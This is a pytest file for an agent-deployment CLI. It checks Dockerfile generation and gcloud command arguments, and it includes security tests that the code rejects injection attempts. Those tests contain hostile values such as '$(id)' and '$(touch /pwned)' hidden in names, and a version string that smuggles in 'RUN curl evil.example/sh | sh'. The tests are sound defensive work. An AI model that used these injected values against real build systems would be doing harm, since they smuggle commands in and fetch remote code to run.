# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for run functionality in cli_deploy."""

from __future__ import annotations

import json
from pathlib import Path
import shutil
import subprocess
import tempfile
from typing import Any
from typing import Dict
from typing import List
from typing import Protocol
from typing import Tuple
from unittest import mock

import click
import pytest

import src.google.adk.cli.cli_deploy as cli_deploy


class AgentDirFixture(Protocol):
  """Protocol for the agent_dir pytest fixture factory."""

  def __call__(self, *, include_requirements: bool, include_env: bool) -> Path:
    ...


# Helpers
def _parse_cmd_argv(dockerfile_content: str) -> List[str]:
  """Extracts and parses the JSON array from a Dockerfile CMD instruction."""
  for line in dockerfile_content.splitlines():
    if line.startswith("CMD "):
      return json.loads(line[len("CMD ") :])
  raise AssertionError("No CMD line found in Dockerfile")


class _Recorder:
  """A callable object that records every invocation."""

  def __init__(self) -> None:
    self.calls: List[Tuple[Tuple[Any, ...], Dict[str, Any]]] = []

  def __call__(self, *args: Any, **kwargs: Any) -> None:
    self.calls.append((args, kwargs))

  def get_last_call_args(self) -> Tuple[Any, ...]:
    """Returns the positional arguments of the last call."""
    if not self.calls:
      raise IndexError("No calls have been recorded.")
    return self.calls[-1][0]

  def get_last_call_kwargs(self) -> Dict[str, Any]:
    """Returns the keyword arguments of the last call."""
    if not self.calls:
      raise IndexError("No calls have been recorded.")
    return self.calls[-1][1]


# Fixtures
@pytest.fixture(autouse=True)
def _mute_click(monkeypatch: pytest.MonkeyPatch) -> None:
  """Suppress click.echo to keep test output clean."""
  monkeypatch.setattr(click, "echo", lambda *_a, **_k: None)
  monkeypatch.setattr(click, "secho", lambda *_a, **_k: None)


@pytest.fixture()
def agent_dir(tmp_path: Path) -> AgentDirFixture:
  """
  Return a factory that creates a dummy agent directory tree.
  """

  def _factory(*, include_requirements: bool, include_env: bool) -> Path:
    base = tmp_path / "agent"
    base.mkdir()
    (base / "agent.py").write_text("# dummy agent")
    (base / "__init__.py").write_text("from . import agent")
    if include_requirements:
      (base / "requirements.txt").write_text("pytest\n")
    if include_env:
      (base / ".env").write_text('TEST_VAR="test_value"\n')
    return base

  return _factory


@pytest.mark.parametrize("include_requirements", [True, False])
@pytest.mark.parametrize("with_ui", [True, False])
def test_to_cloud_run_happy_path(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
    include_requirements: bool,
    with_ui: bool,
) -> None:
  """
  End-to-end execution test for `to_cloud_run`.
  """
  src_dir = agent_dir(
      include_requirements=include_requirements, include_env=False
  )
  run_recorder = _Recorder()

  monkeypatch.setattr(subprocess, "run", run_recorder)
  rmtree_recorder = _Recorder()
  monkeypatch.setattr(shutil, "rmtree", rmtree_recorder)

  cli_deploy.run(
      agent_folder=str(src_dir),
      provider="cloud_run",
      project="proj",
      region="asia-northeast1",
      service_name="svc",
      app_name="agent",
      temp_folder=str(tmp_path),
      port=8080,
      trace_to_cloud=True,
      otel_to_cloud=True,
      with_ui=with_ui,
      log_level="info",
      verbosity="info",
      allow_origins=["http://localhost:3000", "https://my-app.com"],
      session_service_uri="sqlite://",
      artifact_service_uri="gs://bucket",
      memory_service_uri="rag://",
      adk_version="1.3.0",
      provider_args=(),
      env=(),
  )

  agent_dest_path = tmp_path / "agents" / "agent"
  assert (agent_dest_path / "agent.py").is_file()
  assert (agent_dest_path / "__init__.py").is_file()
  assert (
      agent_dest_path / "requirements.txt"
  ).is_file() == include_requirements

  dockerfile_path = tmp_path / "Dockerfile"
  assert dockerfile_path.is_file()
  dockerfile_content = dockerfile_path.read_text()

  cmd_argv = _parse_cmd_argv(dockerfile_content)
  assert cmd_argv[0] == "adk"
  if with_ui:
    assert cmd_argv[1:3] == ["api_server", "--with_ui"]
  else:
    assert cmd_argv[1] == "api_server"
    assert "--with_ui" not in cmd_argv
  assert "--port=8080" in cmd_argv
  assert cmd_argv[-1] == "/app/agents"
  assert "FROM python:3.11-slim" in dockerfile_content
  assert (
      'RUN adduser --disabled-password --gecos "" myuser' in dockerfile_content
  )
  assert "USER myuser" in dockerfile_content
  assert (
      'RUN ["pip", "install", "google-adk[a2a]==1.3.0"]' in dockerfile_content
  )
  assert "--trace_to_cloud" in cmd_argv
  assert "--otel_to_cloud" in cmd_argv

  # Check agent dependencies installation based on include_requirements
  if include_requirements:
    assert (
        'RUN ["pip", "install", "-r", "/app/agents/agent/requirements.txt"]'
        in dockerfile_content
    )
  else:
    assert "# No requirements.txt found." in dockerfile_content

  assert "--allow_origins=http://localhost:3000,https://my-app.com" in cmd_argv

  assert len(run_recorder.calls) == 1
  gcloud_args = run_recorder.get_last_call_args()[0]

  expected_gcloud_command = [
      cli_deploy._GCLOUD_CMD,
      "run",
      "deploy",
      "svc",
      "--source",
      str(tmp_path),
      "--project",
      "proj",
      "--region",
      "asia-northeast1",
      "--port",
      "8080",
      "--update-env-vars",
      "GOOGLE_GENAI_USE_ENTERPRISE=1,GOOGLE_CLOUD_PROJECT=proj,GOOGLE_CLOUD_LOCATION=asia-northeast1",
      "--verbosity",
      "info",
      "--labels",
      "created-by=adk",
  ]
  assert gcloud_args == expected_gcloud_command

  assert str(rmtree_recorder.get_last_call_args()[0]) == str(tmp_path)


def test_to_cloud_run_cleans_temp_dir(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
) -> None:
  """`to_cloud_run` should always delete the temporary folder on exit."""
  tmp_dir = Path(tempfile.mkdtemp())
  src_dir = agent_dir(include_requirements=False, include_env=False)

  deleted: Dict[str, Path] = {}

  def _fake_rmtree(path: str | Path, *_a: Any, **_k: Any) -> None:
    deleted["path"] = Path(path)

  monkeypatch.setattr(shutil, "rmtree", _fake_rmtree)
  monkeypatch.setattr(subprocess, "run", _Recorder())

  cli_deploy.run(
      agent_folder=str(src_dir),
      provider="cloud_run",
      project="proj",
      region=None,
      service_name="svc",
      app_name="app",
      temp_folder=str(tmp_dir),
      port=8080,
      trace_to_cloud=False,
      otel_to_cloud=False,
      with_ui=False,
      log_level="info",
      verbosity="info",
      adk_version="1.0.0",
      session_service_uri=None,
      artifact_service_uri=None,
      memory_service_uri=None,
      provider_args=(),
      env=(),
  )

  assert deleted["path"] == tmp_dir


def test_to_cloud_run_cleans_temp_dir_on_failure(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
) -> None:
  """`run` should delete the temp folder on exit, even if gcloud fails."""
  tmp_dir = Path(tempfile.mkdtemp())
  src_dir = agent_dir(include_requirements=False, include_env=False)

  rmtree_recorder = _Recorder()
  monkeypatch.setattr(shutil, "rmtree", rmtree_recorder)
  monkeypatch.setattr(
      subprocess,
      "run",
      mock.Mock(side_effect=subprocess.CalledProcessError(1, "gcloud")),
  )

  with pytest.raises(subprocess.CalledProcessError):
    cli_deploy.run(
        agent_folder=str(src_dir),
        provider="cloud_run",
        project="proj",
        region="us-central1",
        service_name="svc",
        app_name="app",
        temp_folder=str(tmp_dir),
        port=8080,
        trace_to_cloud=False,
        otel_to_cloud=False,
        with_ui=False,
        log_level="info",
        verbosity="info",
        adk_version="1.0.0",
        session_service_uri=None,
        artifact_service_uri=None,
        memory_service_uri=None,
        provider_args=(),
        env=(),
    )

  assert rmtree_recorder.calls, "shutil.rmtree should have been called"
  assert str(rmtree_recorder.get_last_call_args()[0]) == str(tmp_dir)


@pytest.mark.parametrize("with_cloud_run_sandbox", [True, False])
def test_to_cloud_run_with_sandbox(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
    with_cloud_run_sandbox: bool,
) -> None:
  """Verify --sandbox-launcher and beta release track based on with_cloud_run_sandbox."""
  src_dir = agent_dir(include_requirements=False, include_env=False)
  run_recorder = _Recorder()

  monkeypatch.setattr(subprocess, "run", run_recorder)
  monkeypatch.setattr(shutil, "rmtree", lambda _x: None)

  cli_deploy.to_cloud_run(
      agent_folder=str(src_dir),
      project="proj",
      region="us-central1",
      service_name="svc",
      app_name="app",
      temp_folder=str(tmp_path),
      port=8080,
      trace_to_cloud=False,
      otel_to_cloud=False,
      with_ui=False,
      log_level="info",
      verbosity="info",
      adk_version="1.0.0",
      with_cloud_run_sandbox=with_cloud_run_sandbox,
  )

  assert len(run_recorder.calls) == 1
  gcloud_cmd = run_recorder.get_last_call_args()[0]

  if with_cloud_run_sandbox:
    # 'beta' is inserted right after the gcloud command
    assert gcloud_cmd[1] == "beta"
    assert gcloud_cmd[2] == "run"
    assert "--sandbox-launcher" in gcloud_cmd
  else:
    assert gcloud_cmd[1] == "run"
    assert "--sandbox-launcher" not in gcloud_cmd
    assert "beta" not in gcloud_cmd


def test_to_cloud_run_sandbox_conflict(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
) -> None:
  """Verify that --sandbox-launcher in extra_gcloud_args raises an error when with_cloud_run_sandbox is True."""
  src_dir = agent_dir(include_requirements=False, include_env=False)
  run_recorder = _Recorder()

  monkeypatch.setattr(subprocess, "run", run_recorder)
  monkeypatch.setattr(shutil, "rmtree", lambda _x: None)

  with pytest.raises(click.ClickException) as exc_info:
    cli_deploy.to_cloud_run(
        agent_folder=str(src_dir),
        project="proj",
        region="us-central1",
        service_name="svc",
        app_name="app",
        temp_folder=str(tmp_path),
        port=8080,
        trace_to_cloud=False,
        otel_to_cloud=False,
        with_ui=False,
        log_level="info",
        verbosity="info",
        adk_version="1.0.0",
        with_cloud_run_sandbox=True,
        extra_gcloud_args=("--sandbox-launcher",),
    )

  assert "conflicts with ADK's automatic configuration" in str(exc_info.value)


# Label merging tests
@pytest.mark.parametrize(
    "extra_gcloud_args, expected_labels",
    [
        # No user labels - should only have default ADK label
        (None, "created-by=adk"),
        ([], "created-by=adk"),
        # Single user label
        (["--labels=env=test"], "created-by=adk,env=test"),
        # Multiple user labels in same argument
        (
            ["--labels=env=test,team=myteam"],
            "created-by=adk,env=test,team=myteam",
        ),
        # User labels mixed with other args
        (
            ["--memory=1Gi", "--labels=env=test", "--cpu=1"],
            "created-by=adk,env=test",
        ),
        # Multiple --labels arguments
        (
            ["--labels=env=test", "--labels=team=myteam"],
            "created-by=adk,env=test,team=myteam",
        ),
        # Labels with other passthrough args
        (
            ["--timeout=300", "--labels=env=prod", "--max-instances=10"],
            "created-by=adk,env=prod",
        ),
    ],
)
def test_cloud_run_label_merging(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
    extra_gcloud_args: list[str] | None,
    expected_labels: str,
) -> None:
  """Test that user labels are properly merged with the default ADK label."""
  src_dir = agent_dir(include_requirements=False, include_env=False)
  run_recorder = _Recorder()

  monkeypatch.setattr(subprocess, "run", run_recorder)
  monkeypatch.setattr(shutil, "rmtree", lambda _x: None)

  # Execute the function under test
  cli_deploy.run(
      agent_folder=str(src_dir),
      provider="cloud_run",
      project="test-project",
      region="us-central1",
      service_name="test-service",
      app_name="test-app",
      temp_folder=str(tmp_path),
      port=8080,
      trace_to_cloud=False,
      otel_to_cloud=False,
      with_ui=False,
      log_level="info",
      verbosity="info",
      adk_version="1.0.0",
      extra_gcloud_args=tuple(extra_gcloud_args) if extra_gcloud_args else None,
      provider_args=(),
      env=(),
  )

  # Verify that the gcloud command was called
  assert len(run_recorder.calls) == 1
  gcloud_args = run_recorder.get_last_call_args()[0]

  # Find the labels argument
  labels_idx = gcloud_args.index("--labels")
  actual_labels = gcloud_args[labels_idx + 1]
  assert actual_labels == expected_labels


def test_run_with_default_provider_args_and_env(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
) -> None:
  """`cli_deploy.run` should allow omitting optional provider_args and env."""
  src_dir = agent_dir(include_requirements=False, include_env=False)
  run_recorder = _Recorder()
  monkeypatch.setattr(subprocess, "run", run_recorder)
  monkeypatch.setattr(shutil, "rmtree", lambda _x: None)

  cli_deploy.run(
      agent_folder=str(src_dir),
      provider="cloud_run",
      project="proj",
      region="us-central1",
      service_name="svc",
      app_name="app",
      temp_folder=str(tmp_path),
      port=8080,
      trace_to_cloud=False,
      otel_to_cloud=False,
      with_ui=False,
      log_level="info",
      verbosity="info",
      adk_version="1.0.0",
  )
  assert len(run_recorder.calls) == 1


def test_docker_deploy_does_not_bake_env_vars_into_dockerfile(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
) -> None:
  """Docker deployment must not bake environment variables into the Dockerfile."""
  src_dir = agent_dir(include_requirements=False, include_env=False)
  monkeypatch.setattr(subprocess, "run", _Recorder())
  monkeypatch.setattr(shutil, "rmtree", lambda _x: None)

  cli_deploy.run(
      agent_folder=str(src_dir),
      provider="docker",
      project=None,
      region=None,
      service_name="svc",
      app_name="app",
      temp_folder=str(tmp_path),
      port=8080,
      trace_to_cloud=False,
      otel_to_cloud=False,
      with_ui=False,
      log_level="info",
      verbosity="info",
      adk_version="1.0.0",
      provider_args=(),
      env=(),
  )
  dockerfile_content = (tmp_path / "Dockerfile").read_text()
  assert "ENV GOOGLE_GENAI_USE_ENTERPRISE" not in dockerfile_content
  assert "ENV GOOGLE_CLOUD_PROJECT" not in dockerfile_content
  assert "ENV GOOGLE_CLOUD_LOCATION" not in dockerfile_content


def test_to_cloud_run_backwards_compatibility(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
) -> None:
  """`to_cloud_run` must maintain backwards compatibility as a keyword-only wrapper."""
  src_dir = agent_dir(include_requirements=False, include_env=False)
  run_recorder = _Recorder()
  monkeypatch.setattr(cli_deploy, "run", run_recorder)
  monkeypatch.setattr(shutil, "rmtree", lambda _x: None)

  with pytest.deprecated_call():
    cli_deploy.to_cloud_run(
        agent_folder=str(src_dir),
        project="proj",
        region="us-central1",
        service_name="svc",
        app_name="app",
        temp_folder=str(tmp_path),
        port=8080,
        trace_to_cloud=False,
        otel_to_cloud=False,
        with_ui=False,
        log_level="info",
        verbosity="info",
        adk_version="1.0.0",
    )

  assert len(run_recorder.calls) == 1
  assert run_recorder.calls[0][1]["provider"] == "cloud_run"


def test_run_allows_omitting_project_and_region_for_docker(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
) -> None:
  """`cli_deploy.run` should allow omitting project and region when deploying to docker."""
  src_dir = agent_dir(include_requirements=False, include_env=False)
  run_recorder = _Recorder()
  monkeypatch.setattr(subprocess, "run", run_recorder)
  monkeypatch.setattr(shutil, "rmtree", lambda _x: None)

  cli_deploy.run(
      agent_folder=str(src_dir),
      provider="docker",
      service_name="svc",
      app_name="app",
      temp_folder=str(tmp_path),
      port=8080,
      trace_to_cloud=False,
      otel_to_cloud=False,
      with_ui=False,
      log_level="info",
      verbosity="info",
      adk_version="1.0.0",
  )
  assert len(run_recorder.calls) == 2


_MALICIOUS_APP_NAMES = [
    "foo$(id)bar",
    "foo`id`bar",
    'foo"bar',
    "foo\nRUN evil",
    "../escape",
    "foo/bar",
    "foo bar",
]


@pytest.mark.parametrize("malicious_app_name", _MALICIOUS_APP_NAMES)
def test_render_dockerfile_rejects_malicious_app_name(
    malicious_app_name: str,
) -> None:
  """`_render_dockerfile` should reject invalid `app_name` even if called directly."""
  with pytest.raises((click.ClickException, ValueError)):
    cli_deploy._render_dockerfile(
        app_name=malicious_app_name,
        port=8080,
        command="api_server",
        install_agent_deps="# No requirements.txt found.",
        service_options=[],
        trace_to_cloud_option="",
        otel_to_cloud_option="",
        allow_origins_option="",
        adk_version="1.3.0",
        host_option="--host=0.0.0.0",
        a2a_option="",
        trigger_sources_option="",
        gemini_enterprise_option="",
        express_mode_option="",
        extra_packages_copy="",
    )


@pytest.mark.parametrize(
    "field,value",
    [
        ("adk_version", "1.3.0\nRUN curl evil.example/sh | sh"),
        ("port", "8080\nRUN evil"),
        ("port", "8080\rRUN evil"),
    ],
)
def test_render_dockerfile_rejects_injected_instructions(
    field: str, value: Any
) -> None:
  """A newline in an interpolated value would start a new Dockerfile line."""
  kwargs: Dict[str, Any] = {
      "app_name": "safe_agent",
      "port": 8080,
      "command": "api_server",
      "install_agent_deps": "# No requirements.txt found.",
      "service_options": [],
      "trace_to_cloud_option": "",
      "otel_to_cloud_option": "",
      "allow_origins_option": "",
      "adk_version": "1.3.0",
      "host_option": "--host=0.0.0.0",
      "a2a_option": "",
      "trigger_sources_option": "",
      "gemini_enterprise_option": "",
      "express_mode_option": "",
      "extra_packages_copy": "",
  }
  kwargs[field] = value
  with pytest.raises(click.ClickException, match="line breaks"):
    cli_deploy._render_dockerfile(**kwargs)


@pytest.mark.parametrize("malicious_app_name", _MALICIOUS_APP_NAMES)
def test_to_cloud_run_rejects_malicious_app_name(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
    malicious_app_name: str,
) -> None:
  """`run` aborts before staging anything or invoking gcloud."""
  src_dir = agent_dir(include_requirements=True, include_env=False)
  run_recorder = _Recorder()
  monkeypatch.setattr(subprocess, "run", run_recorder)
  monkeypatch.setattr(shutil, "rmtree", lambda *_a, **_k: None)

  with pytest.raises(click.ClickException):
    cli_deploy.run(
        agent_folder=str(src_dir),
        provider="cloud_run",
        project="proj",
        region="us-central1",
        service_name="svc",
        app_name=malicious_app_name,
        temp_folder=str(tmp_path),
        port=8080,
        trace_to_cloud=False,
        otel_to_cloud=False,
        with_ui=False,
        log_level="info",
        verbosity="info",
        adk_version="1.3.0",
        provider_args=(),
        env=(),
    )

  assert not run_recorder.calls, "gcloud must not be invoked"
  assert not (tmp_path / "Dockerfile").exists()


def test_to_cloud_run_rejects_malicious_agent_folder_basename(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
  """The default app name comes from the folder basename; it is validated too.

  This is the reported attack: cloning a template whose directory name carries
  a command substitution and running `adk deploy` on it.
  """
  src_dir = tmp_path / "src" / "agent$(touch /pwned)"
  src_dir.mkdir(parents=True)
  (src_dir / "agent.py").write_text("# dummy agent")
  (src_dir / "__init__.py").write_text("from . import agent")
  (src_dir / "requirements.txt").write_text("pytest\n")

  run_recorder = _Recorder()
  monkeypatch.setattr(subprocess, "run", run_recorder)
  monkeypatch.setattr(shutil, "rmtree", lambda *_a, **_k: None)

  temp_folder = tmp_path / "build"
  with pytest.raises(click.ClickException):
    cli_deploy.run(
        agent_folder=str(src_dir),
        provider="cloud_run",
        project="proj",
        region="us-central1",
        service_name="svc",
        app_name="",
        temp_folder=str(temp_folder),
        port=8080,
        trace_to_cloud=False,
        otel_to_cloud=False,
        with_ui=False,
        log_level="info",
        verbosity="info",
        adk_version="1.3.0",
        provider_args=(),
        env=(),
    )

  assert not run_recorder.calls, "gcloud must not be invoked"
  assert not (temp_folder / "Dockerfile").exists()


def test_dockerfile_run_and_cmd_use_exec_form() -> None:
  """No interpolated `RUN`/`CMD` in the generated Dockerfile is left in shell form."""
  rendered = cli_deploy._render_dockerfile(
      app_name="my_agent",
      port=8080,
      command="api_server --with_ui",
      install_agent_deps=cli_deploy._render_install_agent_deps(
          "my_agent", __file__, "# No requirements.txt found."
      ),
      service_options=[
          "--session_service_uri=sqlite:///tmp/s.db?mode=ro&cache=shared",
          "--artifact_service_uri=gs://bucket/path",
          "--memory_service_uri=rag://corpus",
      ],
      trace_to_cloud_option="--trace_to_cloud",
      otel_to_cloud_option="--otel_to_cloud",
      allow_origins_option="--allow_origins=https://example.com",
      adk_version="1.3.0",
      host_option="--host=0.0.0.0",
      a2a_option="--a2a",
      trigger_sources_option="--trigger_sources=pubsub,eventarc",
      trigger_oidc_audience_option=(
          "--trigger_oidc_audience=https://aud.example.com"
      ),
      trigger_oidc_service_accounts_option=(
          "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com"
      ),
      gemini_enterprise_option="--gemini_enterprise_app_name=my_agent",
      express_mode_option="--express_mode",
      extra_packages_copy='COPY --chown=myuser:myuser "pkg/" "/app/pkg/"',
  )
  for line in rendered.splitlines():
    stripped = line.strip()
    if stripped.startswith(("RUN ", "CMD ", "ENTRYPOINT ")):
      payload = stripped.split(" ", 1)[1]
      if stripped.startswith("RUN ") and (
          "adduser" in stripped or "dev_server" in stripped
      ):
        # Static instructions with no interpolated values; intentionally left in
        # shell form.
        continue
      assert payload.startswith("[") and payload.endswith(
          "]"
      ), f"instruction is in shell form and would be run by /bin/sh: {line}"
      args = json.loads(payload)
      assert isinstance(args, list)
      assert all(isinstance(a, str) for a in args)
      assert "" not in args, "empty argv entries confuse the CLI parser"


def test_service_uri_shell_metacharacters_are_not_shell_interpreted(
    monkeypatch: pytest.MonkeyPatch,
    agent_dir: AgentDirFixture,
    tmp_path: Path,
) -> None:
  """URIs containing `&`, `;`, `$()`, or quotes must be passed verbatim in exec-form CMD."""
  src_dir = agent_dir(include_requirements=False, include_env=False)
  monkeypatch.setattr(subprocess, "run", _Recorder())
  monkeypatch.setattr(shutil, "rmtree", lambda *_a, **_k: None)

  tricky_uri = (
      'postgresql://user:p@ss@host/db?sslmode=require&options=$(id);"x"'
  )
  cli_deploy.run(
      agent_folder=str(src_dir),
      provider="cloud_run",
      project="proj",
      region="us-central1",
      service_name="svc",
      app_name="safe_agent",
      temp_folder=str(tmp_path),
      port=8080,
      trace_to_cloud=False,
      otel_to_cloud=False,
      with_ui=False,
      log_level="info",
      verbosity="info",
      adk_version="1.3.0",
      session_service_uri=tricky_uri,
      artifact_service_uri=None,
      memory_service_uri=None,
      provider_args=(),
      env=(),
  )

  dockerfile_content = (tmp_path / "Dockerfile").read_text()
  cmd_argv = _parse_cmd_argv(dockerfile_content)
  assert f"--session_service_uri={tricky_uri}" in cmd_argv
